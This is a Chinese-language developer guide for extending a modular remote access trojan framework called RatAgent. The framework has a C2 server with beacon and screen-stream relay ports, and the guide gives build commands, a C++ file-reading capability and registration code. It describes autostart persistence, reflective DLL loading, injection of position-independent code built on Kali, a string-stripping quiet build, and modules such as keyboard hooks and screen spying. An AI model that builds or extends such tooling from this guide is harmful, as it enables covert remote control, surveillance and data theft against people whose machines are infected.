# 开发说明：模块与能力

面向**要在此项目上加东西的人**。构建 / 测试 / 使用流程见 [README.md](../README.md)；
本文只讲"怎么开发、往哪里加、边界在哪"。

- [1. 三层模型（先建立这个心智模型）](#1-三层模型先建立这个心智模型)
- [2. 文件地图：什么该放哪](#2-文件地图什么该放哪)
- [3. 开发一个新模块（六步）](#3-开发一个新模块六步)
- [4. 实现一个能力：完整示例](#4-实现一个能力完整示例)
- [5. 契约与约束（必须遵守）](#5-契约与约束必须遵守)
- [6. 四类典型能力怎么做](#6-四类典型能力怎么做)
- [7. 调试手段](#7-调试手段)
- [8. 什么时候该改 core](#8-什么时候该改-core)
- [9. 提交前检查清单](#9-提交前检查清单)
- [10. 常见陷阱（都真实踩过）](#10-常见陷阱都真实踩过)
- [11. 参考索引](#11-参考索引)

---

## 1. 三层模型（先建立这个心智模型）

```
        ┌─────────────────────────── C2（Go 服务端）───────────────────────────┐
        │  4444 会话/转发 · 4445 屏幕流中继 · 8080 beacon                        │
        └───────▲───────────────────────────────────────────────────▲──────────┘
                │ 指令（按 agent_id 路由到具体模块）                  │ 数据面（可选，自建）
        ┌───────┴───────────────────────────────────────────────────┴──────────┐
        │  模块 agent（独立进程）：sys / screen / <你的模块>                     │
        │   工作线程 → cmd_dispatch ──┬─→ core 内置（0x3001/0x3008/0x3009）      │
        │                             └─→ cap_dispatch → 你的处理函数           │
        │                                   （capability 注册表）               │
        └───────────────────────────────┬──────────────────────────────────────┘
                                        │ 编译期静态链接
        ┌───────────────────────────────┴──────────────────────────────────────┐
        │  client/core/  共享内核：protocol / crypto / net / session / beacon    │
        │                agent_runtime（启停·路径·停止事件·自启动）              │
        │                agent_dll / main（两种外壳）  capability（注册表）      │
        └──────────────────────────────────────────────────────────────────────┘
```

三句话：

1. **core 是共享内核**，它**没有独立工程**——每个模块工程都直接编译 `core/*.cpp`（见各 `.vcxproj`）。
   所以**改 core = 改所有模块**。
2. **模块是独立进程、直连 C2**。模块之间不通信、不互相管理生命周期，也没有插件 ABI/加载器。
3. **能力注册表**（`core/capability.h`）是 core 与模块之间**唯一的接口**：模块把自己的
   "指令 → 处理函数"登记进去，core 不再认识任何具体能力。

> 判据（模块化是否成立）：**加/减一个能力，需要改 core 吗？**
> 需要 ⇒ 边界没切干净，先修边界，再谈开发。

---

## 2. 文件地图：什么该放哪

| 位置 | 放什么 | 改动影响面 |
|---|---|---|
| `client/core/**` | 通信、加密、会话、协议、运行核心、两种外壳、**能力注册表** | **所有模块**（谨慎！） |
| `client/core/module_id.h` | 模块名 / 能力位常量 | 所有模块（但只加常量是安全的） |
| `client/caps_sys.cpp` | **sys 模块**的能力清单（`register_module_capabilities`） | 只 sys 模块 |
| `client/agents/<module>/**` | 某个模块自己的 `.cpp/.h` + 两个 `.vcxproj` + `.vcxproj.filters` | 只该模块 |
| `client/agents/_template/**` | 新模块的起点（复制它） | 模板使用者 |
| `client/agents.sln` | 解决方案（模块分组显示） | 只影响 VS 界面 |
| `scripts/*.py` | 验收脚本 | 只影响测试 |
| `docs/**`、`README.md` | 文档 | — |

工程文件的分工（**两个文件都要动**）：

| 文件 | 作用 | 谁读 |
|---|---|---|
| `<工程名>.vcxproj` | **编译什么**（源文件清单、宏、链接库、中间目录、产物名） | MSBuild / VS 构建 |
| `<工程名>.vcxproj.filters` | **VS 里怎么分组显示** | 只有 VS 界面 |

> ⚠ VS 的 C++ 过滤器**只读 `.vcxproj.filters`**。写进 `.vcxproj` 的 `<Filter>` 无效
> （工程照样能编，但界面里依然平铺）。

---

## 3. 开发一个新模块（六步）

### Step 0 — 先定三件事

| 项 | 怎么选 | 例 |
|---|---|---|
| **模块名** | 小写短名；它决定落盘物（`<module>.id/.log/.autostart.args`）与 C2 侧标签 `Windows (<module>)` | `file` / `keys` / `proxy` |
| **能力位** | 复用 `kCapSys`(bit0) / `kCapRemote`(bit1)；要新类别就在 `core/module_id.h` 加常量（见 §8） | `kCapSys` |
| **指令码** | 在**你自己的段**里挑：`0x1xxx` 远程控制 / `0x2xxx` 文件 / `0x3xxx` 系统 / `0x4xxx` CLI↔C2。**别占** core 内置的 `0x3001/0x3008/0x3009` | `0x2001~0x200F` |

### Step 1 — 复制模板

```powershell
Copy-Item -Recurse client\agents\_template client\agents\<module>
```

### Step 2 — 改两个工程里的四处 + 分组名

两个 `.vcxproj`（EXE + DLL）都要改：

```xml
<RatAgentModuleId><module></RatAgentModuleId>          <!-- 决定命名空间，必须唯一 -->
<RatAgentModuleCaps>(c2::kCapSys)</RatAgentModuleCaps> <!-- 能力位 -->
<TargetName>RatAgent.<module></TargetName>             <!-- 产物名 -->
<ProjectGuid>{换一个全新的 GUID}</ProjectGuid>          <!-- 工程唯一 id -->
```

两个 `.vcxproj.filters` 里把分组 `module (template)` 改成 `module (<module>)`。

> 忘了改 `RatAgentModuleId` / `TargetName` 会怎样？产物名与命名空间仍是 `sys`，
> 与真正的 sys 模块**共用同一份 id 文件** → 服务端按 `agent_id` 索引，**两边互相踢下线**。

### Step 3 — 写能力清单

在 `caps.cpp` 里登记指令（见 §4 的完整示例）。

### Step 4 — 新文件要进**两个**地方

```xml
<!-- ① <工程名>.vcxproj：不进这里就不参与编译 -->
<ItemGroup>
  <ClCompile Include="file_ops.cpp" />
  <ClInclude Include="file_ops.h" />
</ItemGroup>
```

```xml
<!-- ② <工程名>.vcxproj.filters：不进这里，VS 里会散在项目根目录 -->
<ItemGroup>
  <ClCompile Include="file_ops.cpp">
    <Filter>module (file)</Filter>
  </ClCompile>
</ItemGroup>
```

最少一份 `caps.cpp`，但**每个工程都要列全**（EXE 与 DLL 各一份清单）。

### Step 5 — 构建

```powershell
$msb = 'C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\amd64\MSBuild.exe'
& $msb client\agents\<module>\RatAgent.<module>.exe.vcxproj -p:Configuration=Release -p:Platform=x64 `
      -p:IntDir="$PWD/build/agents/<module>/exe-obj/" -p:OutDir="$PWD/build/agents/<module>/exe/"
& $msb client\agents\<module>\RatAgent.<module>.vcxproj     -p:Configuration=Release -p:Platform=x64 `
      -p:IntDir="$PWD/build/agents/<module>/dll-obj/" -p:OutDir="$PWD/build/agents/<module>/dll/"
```

（工程文件名为 `<产物名>.exe.vcxproj` / `<产物名>.vcxproj`；`TargetName` 已显式写好，
所以不会出现 `RatAgent.file.exe.exe` 这种产物名。）

### Step 6 — 验证

```powershell
# ① 工程结构自检（引用是否存在 / 文件是否都分组 / 有无漏项）
python scripts\check_projects.py

# ② 端到端：C2 + 你的模块 + ratctl
.\build\bin\c2server.exe
.\build\agents\<module>\exe\RatAgent.<module>.exe 127.0.0.1 4444 -tcp
.\build\bin\ratctl.exe
#    ratctl> sessions          → 应看到 Windows (<module>) 与你的能力位
#    ratctl> use <module>      → 按模块标签切换
#    ratctl> raw 2001 deadbeef → 打你自己的指令码，看回包
#    ratctl> sysinfo           → core 内置指令照常可用（回归）

# ③ 把验收固化成脚本：复制 scripts/e2e_template.py，改 AGENT 路径与断言即可
```

### （可选）把新模块加进解决方案

编辑 `client/agents.sln`，照着现有条目加一个模块文件夹 + 两个工程：

```
Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "<module>", "<module>", "{解决方案文件夹 GUID}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "RatAgent.<module> (exe)", "agents\<module>\RatAgent.<module>.exe.vcxproj", "{工程 GUID}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "RatAgent.<module> (dll)", "agents\<module>\RatAgent.<module>.vcxproj", "{工程 GUID}"
EndProject
```

并在 `GlobalSection(ProjectConfigurationPlatforms)` 里给两个工程各加 4 行（`Debug|x64`、`Release|x64`
的 `ActiveCfg` 与 `Build.0`），在 `GlobalSection(NestedProjects)` 里把两个工程指到文件夹 GUID。
改完跑 `MSBuild client\agents.sln` 确认整体仍能构建。

---

## 4. 实现一个能力：完整示例

以"读文件"为例（指令码 `0x2001`，文件段）。

```cpp
// client/agents/file/file_ops.cpp — 模块自己的实现
#include "file_ops.h"

#include "protocol.h"          // kStatus* 常量

#include <cstdio>
#include <windows.h>

namespace c2
{

    bool cmd_read_file(uint16_t, const uint8_t* payload, size_t len,
        std::vector<uint8_t>& response, uint8_t& status)
    {
        // 1) 参数校验：失败要给出**明确的 status**，不要"崩了让 core 兜"
        if (len == 0)
        {
            status = kStatusBadParam;
            return true;                     // 已处理（回包带 status）
        }
        std::string path((const char*)payload, len);   // 协议里参数是 UTF-8 字节串

        // 2) 干活
        HANDLE f = CreateFileW(utf8_to_wide(path).c_str(), GENERIC_READ,
            FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (f == INVALID_HANDLE_VALUE)
        {
            status = kStatusNotFound;
            response.assign((const uint8_t*)"open failed", 11);
            return true;
        }
        LARGE_INTEGER sz{};
        GetFileSizeEx(f, &sz);
        if (sz.QuadPart > 64 * 1024 * 1024)   // 3) 大对象要自己想清楚怎么回（见 §5 约束）
        {
            CloseHandle(f);
            status = kStatusBadParam;
            return true;
        }
        response.resize((size_t)sz.QuadPart);
        DWORD got = 0;
        ReadFile(f, response.data(), (DWORD)response.size(), &got, nullptr);
        CloseHandle(f);
        response.resize(got);

        status = kStatusOK;                  // 4) 成功
        return true;                         //    true = 已处理
    }

}  // namespace c2
```

在 `caps.cpp` 里登记：

```cpp
// client/agents/file/caps.cpp
#include "capability.h"
#include "protocol.h"
#include "file_ops.h"

namespace c2
{
    namespace
    {
        const CapCommand kCommands[] = {
            { 0x2001, cmd_read_file },       // { 指令码, 处理函数 }
        };
    }

    void register_module_capabilities()
    {
        cap_register_commands(kCommands, sizeof(kCommands) / sizeof(kCommands[0]));
        // 需要建链配置（例如自建长连接）时再登记配置钩子：
        // cap_register_config(on_config);
    }
}  // namespace c2
```

端到端验证：

```text
ratctl> use file
ratctl> raw 2001 433a5c77696e646f77735c77696e2e696e69      # "C:\windows\win.ini"
ratctl> raw 2001                                            # 空参数 → status 0x02 (BadParam)
```

---

## 5. 契约与约束（必须遵守）

### 5.1 处理函数签名与返回值

```cpp
using CapCommandFn = bool (*)(uint16_t cmd, const uint8_t* payload, size_t len,
                              std::vector<uint8_t>& response, uint8_t& status);
```

| 项 | 规则 |
|---|---|
| 返回值 | `true` = 已处理（core 回 `CMD_RESULT`）；`false` = 未处理（core 按"未知指令"`status=1` 处理） |
| `payload` | **已剥离 16B `agent_id` 前缀**，收到的是纯业务参数；可能是任意二进制 |
| `response` | 原始字节，**可二进制**（截屏就是直接回 JPEG）；空则回空包 |
| `status` | 见下表；**失败也要 `return true`**，让 C2 看到明确的错误码 |

### 5.2 status 码（`core/protocol.h`）

| 值 | 名称 | 用途 |
|---|---|---|
| `0x00` | `kStatusOK` | 成功 |
| `0x01` | `kStatusUnknownCmd` | 未实现（**由 core 兜底**，处理器一般不用自己设） |
| `0x02` | `kStatusBadParam` | 参数非法 |
| `0x03` | `kStatusNoPermission` | 权限不足 |
| `0x04` | `kStatusNotFound` | 目标不存在 |
| `0x05` | `kStatusTimeout` | 超时 |
| `0x06` | `kStatusNoSession` | 无会话 |
| `0x80+` | `kStatusPluginErrBase` | **模块自定义错误段**：`kStatusPluginErrBase + n` |

### 5.3 硬约束

| 约束 | 为什么 | 违反后果 |
|---|---|---|
| **处理器必须同步给出结果** | 注册表是"请求/响应"式的，**没有异步回包 API** | 结果无处可回 |
| **不要在处理器里做长耗时/阻塞操作** | 处理器跑在 agent 的接收循环里（beacon 轮询线程 / TCP 读循环） | 心跳停摆、后续指令排队 |
| **线程要能在停止时退出** | `agent_stop()` 会等线程收敛（默认 8s） | agent 停不下来 / 进程残留 |
| **导出函数内不抛异常** | 手动映射（反射加载）时 `.pdata` 可能未注册，异常无法展开 | 宿主进程崩溃 |
| **不依赖 CWD / `GetModuleFileName`** | 反射加载后磁盘上可能没有对应文件 | 路径错乱 |
| **不要占用 core 内置指令码** | `0x3001/0x3008/0x3009` 由 core 直接处理 | 你的分支永远收不到 |
| **不要登记同一个 cmd 两次** | `cap_dispatch` 按表顺序命中第一个 | 后者静默失效 |
| **别把模块独有实现塞进 `core/`** | core 被所有模块编译 | 所有模块被污染 |

### 5.4 模块命名空间（自动生效，你不用做）

| 项 | 行为 |
|---|---|
| 落盘物 | `%LOCALAPPDATA%\RatAgent\<module>.id` / `.log` / `.autostart.args`；EXE 形态的 `.id` 落 CWD |
| C2 标签 | 握手 `os_info` = `Windows (<module>)`（仅 `-tcp` 可见） |
| 能力位 | `plugins` 位图（`sessions` / `session <id>` 可见） |
| 停止事件 | `Local\RatAgentStop.<agent_id_hex>`（**刻意不带模块前缀**：任一模块的 DLL 都能停任意模块实例） |
| 加载即自启 | `autostart.args` 存在且非空 → 用文件参数；不存在或为空 → 内置默认配置（见 README"使用 §7"） |

### 5.5 配置钩子（需要建链信息时）

```cpp
using CapConfigFn = void (*)(const std::string& host, const AgentConfig& cfg);
```

`AgentConfig`（`core/session.h`）含 `host` / `port` / `psk` / `os_info` / `agent_id[16]` / `plugins_bitmap`。
core 在建链前调用所有已登记的钩子 —— **不要在处理器里读全局连接状态**，用钩子拿。

---

## 6. 四类典型能力怎么做

| 类型 | 例子 | 做法 | 参考 |
|---|---|---|---|
| **纯请求/响应** | 读/写文件、列进程、查注册表 | 只在 `caps.cpp` 加 `{cmd, fn}`，实现同步处理 | 本文 §4 |
| **需要状态/长任务** | 文件分块上传、键盘钩子、长轮询 | 自己的 `.cpp` 里维护状态 + 起线程；**线程必须能被 `agent_stop` 收敛** | `core/cmd_dispatch.cpp` 的 `0x3009` payload 分块 |
| **流式 / 高带宽** | 屏幕流、隧道 | **自建通道**：`cap_register_config` 拿 `host/psk` → 自己线程 + 自己连接（如 4445 中继） | `client/agents/screen/`（`screen_stream.cpp`） |
| **需要注入交付** | 任何模块 | 编 DLL → 在 Kali 上 `cpl link` 出 PIC → 宿主执行；守手动映射契约 | README"构建 §5"、`docs/PROGRESS.md` §8.5 |

> **流式的关键**：C2 的 4445 中继把帧转给"**发起 `0x1002` 的那条 ctl 连接**"。
> 所以你的流模块要在 `0x1002` 的处理器里发起连接，而不是在别处。

---

## 7. 调试手段

| 手段 | 怎么做 |
|---|---|
| 日志 | `AGENT_LOG("... %d\n", x)`（`core/agent_debug.h`）。EXE 形态看 stdout；DLL 形态落 `%LOCALAPPDATA%\RatAgent\<module>.log`（可用 `id=`/`log=` 覆盖） |
| 打任意指令 | `ratctl> raw <cmd_hex> [payload_hex]` —— 测新指令最快的方式 |
| 看标签与能力位 | `ratctl> sessions` / `session <id>`（**用 `-tcp`**，beacon 侧的元数据是硬编码的已知缺口） |
| 工程结构 | `python scripts/check_projects.py`（引用存在性 / 分组 / 漏项 / XML 合法性） |
| 端到端 | 复制 `scripts/e2e_template.py` 改成你的断言（它自带进程管理、日志断言、清理） |
| 断点 | 用 VS 打开 `client/agents.sln`，直接 F5 调试模块工程（Debug 配置） |
| 反射加载链路 | 改了 core 一定要**重链 PIC**，否则测试跑的是旧代码（见 README"构建 §5"） |

> ⚠ **排查问题时不要用静默构建**（`-p:RatAgentDebug=0`）：它会把 `AGENT_LOG` 连同格式串一起编掉，
> 日志与诊断串全部消失（这是它的设计目的）。

---

## 8. 什么时候该改 core

**允许**：

- 修 core 自己的 bug（协议/加密/会话/运行核心）；
- **新增能力位常量**（`core/module_id.h`，如 `kCapFile = 1u << 2`）——这是唯一常规的"动 core"；
- 新增**所有模块都用得上**的公共设施（例如统一的分块传输 helper）。

**不允许**：

- 为了某个模块的独有能力，在 `core/cmd_dispatch.cpp` 里加 `case`、或在 core 里 include 模块头。

**判据**（两条都要过）：

1. 把某个模块目录整个删掉，core 还能不能编过？
2. 加一个新能力，需要动 core 吗？

需要动 ⇒ 边界没切干净，先修边界（把依赖反转成注册/回调），再开发能力。

> 历史教训（模块化阶段 1）：core 曾经直接 `include "screen_spy.h"`、`switch` 里写死 `0x1001/0x1002`、
> `agent_runtime.cpp` 直接调 `screen_stream_set_config()` —— 结果是"加减一个能力必须改 core"。
> 现在这些依赖都反转成了 `capability.h` 的注册表。详见 `docs/PROGRESS.md` §9.2。

---

## 9. 提交前检查清单

```powershell
# 1) 静态自检：工程结构 + 文档链接
python scripts\check_projects.py
python scripts\check_docs.py

# 2) 构建（按 README"构建 §3"的布局，或至少编你改动的工程）
#    — 只改了一个模块：编该模块的两个工程即可
#    — 改了 client/core：所有模块都要重编（core 被编进每个模块）

# 3) 回归（改了 core 必须全跑；只加模块至少跑该模块的 e2e + e2e_modules）
python scripts\e2e_modules.py      # 命名空间共存没被破坏
python scripts\e2e_template.py     # 模板/注册表仍可用
python scripts\e2e_screen.py       # 拆出去的 screen 模块没被影响
python scripts\e2e_rdll.py         # 反射加载（改过 core 需先重链 PIC）
python scripts\e2e_quiet.py        # 静默构建

# 4) 文档：新增模块 → 更新 README"模块清单"；改公共契约 → 更新本文与 docs/PROGRESS.md
```

---

## 10. 常见陷阱（都真实踩过）

| 陷阱 | 症状 | 规避 |
|---|---|---|
| 忘了改 `RatAgentModuleId` / `TargetName` | 两个模块**互相踢下线**（共用同一份 id 文件） | Step 2 的四处都要改 |
| 新 `.cpp` 只写进 `.vcxproj.filters`（或都没写） | 编译报**未定义符号**，或功能静默不生效 | 两个文件都要加（§3 Step 4） |
| 新文件没挂 `.filters` 分组 | VS 里散在项目根目录 | `check_projects.py` 会报 |
| XML 注释里写了 `--`（如 `<!-- ---- 分节 ---- -->`） | **工程文件非法**，MSBuild 报 parse error | 别用连续 `--`；`check_projects.py` 第一项能抓 |
| 改了工程文件名但没写 `<TargetName>` | 产物叫 `RatAgent.sys.exe.exe` | 显式写 `<TargetName>` |
| 为了让模块能用，往 `core/cmd_dispatch.cpp` 加 `case` | 所有模块都被污染 | 用注册表登记（§8） |
| 处理器里做长任务/阻塞 | 心跳停摆、指令排队、`Stop` 卡住 | 起线程 + 自建通道（§6） |
| 自己起的线程没有停止路径 | agent 停不下来 / 进程残留 | 用 core 的停止标志或自己的事件，`agent_stop` 前收敛 |
| 用静默构建排查 | 日志/诊断串全无 | 用默认构建排查 |
| 改了 `client/core` 但没重链 PIC | 反射加载测试**全 PASS 但改动没生效** | 重链 PIC 并确认新串进了 `out.bin` |
| 在 beacon 信道上找模块标签 | `sessions` 显示 `beacon-agent` | 用 `-tcp`（已知缺口） |
| 对 `sys` 模块发 `0x1001/0x1002` | 返回未知指令 `status=1` | 这两个指令在 `screen` 模块：`use screen` |

---

## 11. 参考索引

| 文件 | 作用 |
|---|---|
| [client/core/capability.h](../client/core/capability.h) | **能力注册表的契约**（处理器表 + 配置钩子），回答"为什么这样切" |
| [client/core/module_id.h](../client/core/module_id.h) | 模块命名空间规则与能力位常量 |
| [client/core/agent_debug.h](../client/core/agent_debug.h) | `AGENT_LOG` 与构建开关（静默/身份持久化） |
| [client/core/agent_runtime.h](../client/core/agent_runtime.h) | 运行核心 API（启停、路径、自启动契约） |
| [client/core/protocol.h](../client/core/protocol.h) | 指令码、`status` 码、插件段常量 |
| [client/core/session.h](../client/core/session.h) | `AgentConfig`（配置钩子拿到的连接信息） |
| [client/agents/_template/README.md](../client/agents/_template/README.md) | 模板自带的最短上手说明 |
| [client/agents/_template/caps.cpp](../client/agents/_template/caps.cpp) | 指令登记的最小形状（可直接抄） |
| [client/agents/screen/](../client/agents/screen/) | **唯一"有独立数据面"的完整样例**（自建 4445 长连接 + 输入回放） |
| [scripts/e2e_template.py](../scripts/e2e_template.py) | 验收脚本模板（进程管理 + 断言 + 清理） |
| [scripts/check_projects.py](../scripts/check_projects.py) | 工程结构自检（改动工程文件后必跑） |
| [scripts/check_docs.py](../scripts/check_docs.py) | 文档自检（改了文档/搬了文件后跑，避免死链） |
| [README.md](../README.md) | 构建 / 测试 / 使用 / 排错流程 |
| [docs/PROGRESS.md](PROGRESS.md) | 进度与实测记录（§9 是模块化的全过程与证据） |
| [docs/DESIGN.md](DESIGN.md) | 设计取舍（手动映射契约、注入方式选择） |
